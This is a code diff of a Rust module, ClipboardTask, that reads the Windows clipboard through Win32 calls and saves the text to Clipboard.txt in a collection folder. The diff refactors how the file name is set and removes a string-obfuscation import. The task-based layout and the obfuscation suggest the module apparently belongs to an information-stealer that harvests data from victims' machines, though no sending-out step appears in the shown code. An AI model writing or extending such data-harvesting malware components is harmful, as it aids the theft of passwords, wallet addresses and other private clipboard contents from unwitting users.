@@ -1,14 +1,16 @@
+use crate::alloc::borrow::ToOwned;
 use alloc::string::String;
 use core::ptr::{null_mut, slice_from_raw_parts};
 use windows_sys::Win32::System::DataExchange::{CloseClipboard, GetClipboardData, OpenClipboard};
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
-use tasks::Task;
+use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
-use obfstr::obfstr as s;
 
 pub(super) struct ClipboardTask;
 
 impl Task for ClipboardTask {
+    parent_name!("Clipboard.txt");
+    
     unsafe fn run(&self, parent: &Path) {
         if OpenClipboard(null_mut()) == 0 {
             return;
@@ -43,7 +45,6 @@ impl Task for ClipboardTask {
             return;
         }
         
-        let output = parent / s!("Clipboard.txt");
-        let _ = str.write_to(&output);
+        let _ = str.write_to(parent);
     }
 }
